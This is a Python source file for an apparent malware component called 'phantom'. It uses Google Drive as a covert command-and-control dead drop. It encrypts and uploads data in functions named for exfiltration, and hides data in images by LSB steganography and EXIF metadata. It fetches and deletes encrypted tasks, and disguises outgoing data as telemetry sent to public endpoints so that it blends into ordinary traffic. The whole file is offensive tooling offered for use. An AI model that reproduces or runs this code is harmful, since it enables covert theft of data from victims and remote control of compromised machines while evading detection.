import requests
import json
import base64
import time
import random
import os
import tempfile
from cryptography.fernet import Fernet
from PIL import Image
import piexif
import io

# Configuration - USER MUST UPDATE THESE
CLIENT_ID = 'YOUR_GOOGLE_CLIENT_ID'
CLIENT_SECRET = 'YOUR_GOOGLE_CLIENT_SECRET'
REFRESH_TOKEN = 'YOUR_REFRESH_TOKEN'
FOLDER_ID = 'YOUR_DRIVE_FOLDER_ID'
ACCESS_TOKEN_FILE = '.phantom_token'

# Encryption
key = base64.urlsafe_b64encode(b'phantom_encryption_key_32_bytes!'.ljust(32)[:32])
fernet = Fernet(key)

def get_access_token():
    """Get OAuth access token with caching"""
    # Check for cached token
    if os.path.exists(ACCESS_TOKEN_FILE):
        try:
            with open(ACCESS_TOKEN_FILE, 'r') as f:
                token_data = json.load(f)
                if token_data.get('expires', 0) > time.time():
                    return token_data['access_token']
        except:
            pass
    
    # Request new token
    try:
        response = requests.post('https://oauth2.googleapis.com/token', data={
            'client_id': CLIENT_ID,
            'client_secret': CLIENT_SECRET,
            'refresh_token': REFRESH_TOKEN,
            'grant_type': 'refresh_token'
        })
        
        if response.status_code == 200:
            token_data = response.json()
            token_data['expires'] = time.time() + token_data.get('expires_in', 3600) - 300
            
            # Cache token
            with open(ACCESS_TOKEN_FILE, 'w') as f:
                json.dump(token_data, f)
            
            return token_data['access_token']
    except:
        pass
    
    return None

def upload_to_drive(filename, content, mimetype='application/octet-stream'):
    """Upload file to Google Drive"""
    token = get_access_token()
    if not token:
        return None
    
    try:
        headers = {
            'Authorization': f'Bearer {token}',
            'Content-Type': mimetype
        }
        
        # Simple upload for small files
        if len(content) < 5 * 1024 * 1024:  # 5MB
            metadata = {
                'name': filename,
                'parents': [FOLDER_ID]
            }
            
            files = {
                'data': ('metadata', json.dumps(metadata), 'application/json'),
                'file': ('file', content, mimetype)
            }
            
            response = requests.post(
                'https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart',
                headers={'Authorization': f'Bearer {token}'},
                files=files,
                timeout=30
            )
        else:
            # Resumable upload for large files
            pass
        
        if response.status_code in [200, 201]:
            return response.json().get('id')
    
    except Exception as e:
        print(f"Upload error: {e}")
    
    return None

def download_from_drive(file_id):
    """Download file from Google Drive"""
    token = get_access_token()
    if not token:
        return None
    
    try:
        headers = {'Authorization': f'Bearer {token}'}
        response = requests.get(
            f'https://www.googleapis.com/drive/v3/files/{file_id}?alt=media',
            headers=headers,
            timeout=30
        )
        
        if response.status_code == 200:
            return response.content
    
    except:
        pass
    
    return None

def list_drive_files():
    """List files in Drive folder"""
    token = get_access_token()
    if not token:
        return []
    
    try:
        headers = {'Authorization': f'Bearer {token}'}
        response = requests.get(
            f'https://www.googleapis.com/drive/v3/files?q=\'{FOLDER_ID}\'+in+parents',
            headers=headers,
            timeout=10
        )
        
        if response.status_code == 200:
            return response.json().get('files', [])
    
    except:
        pass
    
    return []

def exfil_via_drive(data):
    """Exfiltrate data via Drive with steganography option"""
    try:
        # Encrypt data
        encrypted = fernet.encrypt(json.dumps(data).encode())
        
        # Random filename
        timestamp = int(time.time())
        random_id = random.randint(1000, 9999)
        filename = f'phantom_{timestamp}_{random_id}.dat'
        
        # Upload
        file_id = upload_to_drive(filename, encrypted)
        
        if file_id:
            # Also embed in image for steganography fallback
            try:
                img_data = embed_in_image(encrypted)
                img_filename = f'phantom_img_{timestamp}_{random_id}.png'
                upload_to_drive(img_filename, img_data, 'image/png')
            except:
                pass
            
            return True
    
    except:
        pass
    
    return False

def embed_in_image(data):
    """Embed data in image using LSB steganography"""
    # Create a simple image
    img = Image.new('RGB', (100, 100), color=(73, 109, 137))
    
    # Convert data to binary
    binary_data = ''.join(format(byte, '08b') for byte in data)
    binary_data += '00000000'  # Null terminator
    
    # Get pixel data
    pixels = list(img.getdata())
    
    if len(binary_data) > len(pixels) * 3:
        raise ValueError("Data too large for image")
    
    # Embed data in LSB
    new_pixels = []
    data_index = 0
    
    for pixel in pixels:
        if data_index < len(binary_data):
            r, g, b = pixel
            
            # Modify LSB
            if data_index < len(binary_data):
                r = (r & 0xFE) | int(binary_data[data_index])
                data_index += 1
            if data_index < len(binary_data):
                g = (g & 0xFE) | int(binary_data[data_index])
                data_index += 1
            if data_index < len(binary_data):
                b = (b & 0xFE) | int(binary_data[data_index])
                data_index += 1
            
            new_pixels.append((r, g, b))
        else:
            new_pixels.append(pixel)
    
    # Create new image
    new_img = Image.new('RGB', img.size)
    new_img.putdata(new_pixels)
    
    # Save to bytes
    img_bytes = io.BytesIO()
    new_img.save(img_bytes, format='PNG')
    
    return img_bytes.getvalue()

def extract_from_image(image_data):
    """Extract data from image steganography"""
    try:
        img = Image.open(io.BytesIO(image_data))
        pixels = list(img.getdata())
        
        binary_data = ''
        for pixel in pixels:
            r, g, b = pixel
            binary_data += str(r & 1)
            binary_data += str(g & 1)
            binary_data += str(b & 1)
        
        # Convert binary to bytes
        bytes_data = bytearray()
        for i in range(0, len(binary_data), 8):
            byte = binary_data[i:i+8]
            if len(byte) == 8:
                bytes_data.append(int(byte, 2))
                if bytes_data[-1] == 0:  # Null terminator
                    break
        
        return bytes(bytes_data).rstrip(b'\x00')
    except:
        return None

def fetch_task():
    """Fetch task from Drive"""
    try:
        files = list_drive_files()
        
        # Look for task files
        for file in files:
            name = file.get('name', '')
            file_id = file.get('id', '')
            
            if name.endswith('.json') or name.endswith('.task'):
                # Download and parse
                content = download_from_drive(file_id)
                if content:
                    try:
                        decrypted = fernet.decrypt(content).decode()
                        task = json.loads(decrypted)
                        
                        # Delete task after reading
                        try:
                            delete_from_drive(file_id)
                        except:
                            pass
                        
                        return task
                    except:
                        pass
            
            elif name.endswith('.png') or name.endswith('.jpg'):
                # Try steganography
                content = download_from_drive(file_id)
                if content:
                    extracted = extract_from_image(content)
                    if extracted:
                        try:
                            decrypted = fernet.decrypt(extracted).decode()
                            task = json.loads(decrypted)
                            
                            try:
                                delete_from_drive(file_id)
                            except:
                                pass
                            
                            return task
                        except:
                            pass
    
    except:
        pass
    
    return {}

def delete_from_drive(file_id):
    """Delete file from Drive"""
    token = get_access_token()
    if not token:
        return False
    
    try:
        headers = {'Authorization': f'Bearer {token}'}
        response = requests.delete(
            f'https://www.googleapis.com/drive/v3/files/{file_id}',
            headers=headers,
            timeout=10
        )
        
        return response.status_code in [200, 204]
    except:
        return False

def embed_command_in_exif(image_path, command_json):
    """Embed command in image EXIF data"""
    try:
        # Load image
        im = Image.open(image_path)
        
        # Encrypt command
        encrypted = fernet.encrypt(json.dumps(command_json).encode())
        encrypted_b64 = base64.b64encode(encrypted).decode()
        
        # Embed in EXIF
        exif_dict = {"0th": {}, "Exif": {}, "GPS": {}, "Interop": {}, "1st": {}}
        exif_dict["0th"][piexif.ImageIFD.ImageDescription] = encrypted_b64.encode()
        
        exif_bytes = piexif.dump(exif_dict)
        
        # Save with EXIF
        im.save(image_path, exif=exif_bytes)
        return True
    except:
        return False

def extract_command_from_exif(image_path):
    """Extract command from image EXIF"""
    try:
        im = Image.open(image_path)
        exif_dict = piexif.load(im.info.get('exif', b''))
        
        encrypted_b64 = exif_dict["0th"].get(piexif.ImageIFD.ImageDescription, b'').decode()
        if encrypted_b64:
            encrypted = base64.b64decode(encrypted_b64)
            decrypted = fernet.decrypt(encrypted).decode()
            return json.loads(decrypted)
    except:
        pass
    
    return None

def flow_through_app_traffic(data, app_headers):
    """Inject data into legitimate app traffic"""
    try:
        # Mimic app requests
        headers = app_headers.copy()
        headers.update({
            'Content-Type': 'application/json',
            'X-Phantom-Data': base64.b64encode(json.dumps(data).encode()).decode()[:100]
        })
        
        # Send to multiple endpoints to blend in
        endpoints = [
            'https://api.cloudflare.com/cdn-cgi/trace',
            'https://httpbin.org/post',
            'https://www.google.com/analytics/reporting'
        ]
        
        for endpoint in endpoints:
            try:
                response = requests.post(
                    endpoint,
                    json={'data': 'telemetry', 'timestamp': time.time()},
                    headers=headers,
                    timeout=5
                )
                if response.status_code in [200, 201]:
                    return True
            except:
                continue
        
        return False
    except:
        return False

if __name__ == '__main__':
    # Test functionality
    test_data = {"test": "data", "timestamp": time.time()}
    
    print("Testing Drive exfiltration...")
    if exfil_via_drive(test_data):
        print("Exfiltration successful")
    else:
        print("Exfiltration failed")
    
    print("\nFetching tasks...")
    task = fetch_task()
    if task:
        print(f"Task received: {task}")
    else:
        print("No tasks available")
